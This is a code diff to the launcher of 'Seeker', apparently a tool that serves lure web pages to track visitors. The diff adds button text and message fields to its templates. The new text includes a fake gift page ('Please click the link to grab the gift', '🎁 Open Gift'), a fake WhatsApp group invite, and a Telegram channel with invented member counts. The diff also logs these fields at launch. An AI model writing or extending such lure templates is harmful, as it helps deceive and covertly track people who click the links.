@@ -35,6 +35,7 @@ DEFAULT_CONFIG = {
     "title": "",
     "image": "",
     "desc": "",
+    "btn_text": "",
     "sitename": "",
     "mem_num": "",
     "online_num": "",
@@ -206,7 +207,7 @@ def start_tracker(config_dict=None):
     # Optional notifications & parameters from config
     param_keys = [
         'TELEGRAM', 'WEBHOOK', 'KML',
-        'REDIRECT', 'TITLE', 'IMAGE', 'DESC',
+        'REDIRECT', 'TITLE', 'IMAGE', 'DESC', 'BTN_TEXT', 'MODAL_MSG',
         'SITENAME', 'MEM_NUM', 'ONLINE_NUM', 'DISPLAY_URL'
     ]
     for key in param_keys:
@@ -218,8 +219,19 @@ def start_tracker(config_dict=None):
     TEMPLATE_DEFAULTS = {
         0: {},
         1: {"REDIRECT": "https://drive.google.com"},
-        2: {"TITLE": "Name sent you a gift.", "DESC": "Please click the link to grab the gift.", "IMAGE": "https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop"},
-        3: {"TITLE": "Project Updates", "IMAGE": "template/whatsapp/images/ZIvBTrQd9nP.png", "REDIRECT": "https://chat.whatsapp.com"},
+        2: {
+            "TITLE": "Name sent you a gift.",
+            "DESC": "Please click the link to grab the gift.",
+            "BTN_TEXT": "🎁 Open Gift",
+            "IMAGE": "https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop"
+        },
+        3: {
+            "TITLE": "Project Updates & Group",
+            "DESC": "WhatsApp Group Invite",
+            "BTN_TEXT": "Join Chat",
+            "IMAGE": "template/whatsapp_redirect/images/ZIvBTrQd9nP.png",
+            "REDIRECT": "https://chat.whatsapp.com"
+        },
         4: {"TITLE": "News & Signals Channel", "IMAGE": "template/telegram/images/Arrow_1x.png", "DESC": "Official Group for Updates", "MEM_NUM": "1,420", "ONLINE_NUM": "84"},
         5: {"TITLE": "Conference Meeting Topic"},
         6: {"REDIRECT": "https://google.com", "DISPLAY_URL": "https://google.com/verify"},
@@ -247,7 +259,7 @@ def start_tracker(config_dict=None):
         env['IMAGE'] = defaults.get('IMAGE', 'https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop')
 
     # Keep cfg aligned with resolved env
-    for k in ['TITLE', 'DESC', 'IMAGE']:
+    for k in ['TITLE', 'DESC', 'IMAGE', 'BTN_TEXT', 'MODAL_MSG']:
         if k in env:
             cfg[k.lower()] = env[k]
 
@@ -261,6 +273,12 @@ def start_tracker(config_dict=None):
     log_fp.write(f"\n=======================================================\n")
     log_fp.write(f"[+] Launching Seeker ({template_name} - Template #{template_id}) on port {port}\n")
     log_fp.write(f"[+] Started at: {cfg['started_at']}\n")
+    if env.get('TITLE'):
+        log_fp.write(f"[+] Title: {env['TITLE']}\n")
+    if env.get('DESC'):
+        log_fp.write(f"[+] Description: {env['DESC']}\n")
+    if env.get('BTN_TEXT'):
+        log_fp.write(f"[+] Action Button: {env['BTN_TEXT']}\n")
     if env.get('TELEGRAM'):
         log_fp.write(f"[+] Telegram Alerts: ENABLED\n")
     if env.get('WEBHOOK'):
